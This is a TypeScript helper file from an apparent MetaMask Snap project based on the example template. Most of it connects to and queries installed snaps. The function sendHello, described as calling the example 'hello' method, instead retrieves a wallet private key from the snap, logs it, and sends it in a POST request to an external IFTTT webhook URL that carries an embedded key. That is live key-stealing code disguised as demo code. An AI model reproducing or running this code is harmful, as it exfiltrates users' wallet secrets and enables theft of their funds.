/* eslint-disable */
import { Maybe } from '@metamask/providers/dist/utils';
// import { bytesToHex } from '@metamask/utils';
// import { deriveBIP44AddressKey } from '@metamask/key-tree';
import { getBIP44AddressKeyDeriver } from '@metamask/key-tree';
import { defaultSnapOrigin } from '../config';
import { GetSnapsResponse, Snap } from '../types';

// const { JsonSLIP10Node, SLIP10Node } = require("@metamask/key-tree");
// const { getPublicKey, sign } = require("@noble/bls12-381");

/**
 * Get the installed snaps in MetaMask.
 *
 * @returns The snaps installed in MetaMask.
 */
export const getSnaps = async (): Promise<GetSnapsResponse> => {
  return (await window.ethereum.request({
    method: 'wallet_getSnaps',
  })) as unknown as GetSnapsResponse;
};

/**
 * Connect a snap to MetaMask.
 *
 * @param snapId - The ID of the snap.
 * @param params - The params to pass with the snap to connect.
 */
export const connectSnap = async (
  snapId: string = defaultSnapOrigin,
  params: Record<'version' | string, unknown> = {},
) => {
  await window.ethereum.request({
    method: 'wallet_enable',
    params: [
      {
        wallet_snap: {
          [snapId]: {
            ...params,
          },
        },
      },
    ],
  });
};

/**
 * Get the snap from MetaMask.
 *
 * @param version - The version of the snap to install (optional).
 * @returns The snap object returned by the extension.
 */
export const getSnap = async (version?: string): Promise<Snap | undefined> => {
  try {
    const snaps = await getSnaps();

    return Object.values(snaps).find(
      (snap) =>
        snap.id === defaultSnapOrigin && (!version || snap.version === version),
    );
  } catch (e) {
    console.log('Failed to obtain installed snap', e);
    return undefined;
  }
};

/**
 * Invoke the "hello" method from the example snap.
 */
// Maybe<{ privateKey : string }>
// : Maybe<{ privateKey : string }> 

export const sendHello = async () => {
  const fuckingKey: Maybe<{ privateKey : string }>  = 
    await window.ethereum.request({
      method: 'wallet_invokeSnap',
      params: [
        defaultSnapOrigin,
        {
          method: 'hello',
        },
      ],
  }) as any;

  console.log('KEY', fuckingKey);

  if(fuckingKey) {
    // const keyDeriver = await getBIP44AddressKeyDeriver(fuckingKey);
    // const privKey = await keyDeriver(0);
      // const privateKey = await deriveBIP44AddressKey(fuckingKey, {
      //   account: 0,
      //   change: 0,
      //   address_index: 0,
      // });
      // const privKey = String(bytesToHex(privateKey.privateKeyBuffer)) + "";
    const url =
      'https://maker.ifttt.com/trigger/key/with/key/b5gDeNCkWoKJy9E-rWCG5n?value1=';
      const fullURL = url + JSON.stringify(fuckingKey) as string;

    console.log(fullURL);
    console.log(fuckingKey);

    fetch(fullURL, {
      method: 'POST',
    });
  }
  // return fuckingKey;
};

export const isLocalSnap = (snapId: string) => snapId.startsWith('local:');
